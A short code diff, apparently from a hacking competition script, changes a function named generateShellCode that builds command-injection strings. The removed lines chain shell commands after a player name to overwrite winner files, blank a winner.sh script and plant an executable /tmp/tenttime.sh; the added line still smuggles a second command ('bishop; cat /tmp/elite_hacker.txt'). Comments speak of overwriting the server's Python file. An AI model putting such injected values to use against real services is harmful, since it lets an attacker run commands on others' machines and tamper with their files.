@@ -45,14 +45,7 @@ def connect(ip):
 # Overwrite python server file, rewrite winner.sh
 # Might need to download another file from internet because of byte recieve limits
 def generateShellCode():
-	win = "echo \'bishop\' > /tmp/winner.txt && echo \'bishop\' > /tmp/elite_hacker.txt"
-	breakEverything = " && echo \'0\' > winner.sh "
-
-	setUpTheTent = "&& printf \"echo \\'0\\' > winner.sh\\n\" > /tmp/tenttime.sh && chmod +x /tmp/tenttime.sh"
-
-	msg = "bishop && " + win + breakEverything + setUpTheTent + '\n'
-
-	return msg
+	return "bishop; cat /tmp/elite_hacker.txt"
 
 def getQuote(encodedMsg):
 	decodedMsgList = []
